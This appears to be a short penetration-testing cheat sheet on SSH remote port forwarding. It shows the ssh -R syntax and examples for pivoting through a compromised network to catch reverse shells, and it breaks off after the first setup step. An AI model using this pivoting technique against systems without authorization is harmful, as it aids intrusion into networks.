- Remote port forwarding is used to expose a local service to a remote port.
- It is helpful when we want to catch reverse shells from compromised hosts in a pivoted network. 



#### Syntax 

```bash
ssh -R pivot_host_ip:port_to_listen_on:0.0.0.0:port_to_forward_all_traffic username@host

Example:

ssh -R 172.16.0.2:8080:0.0.0.0:8000 ubuntu@localhost
```



The above command will ask the ubuntu server to listen on port 8080 and forward any traffic sent to it to port 8000 on our local machine. 


#### Leveraging it for a reverse shell

We can use remote port forwarding to gain a reverse shell on our machine from a box which can only be accessed by the pivot box. To do this, we do the following :


1. Setup Remote Port Forwarding using SSH

```bash
ssh -R 172.16.0.2:9001:0.0.0.0:9001 ubuntu@localhost
```
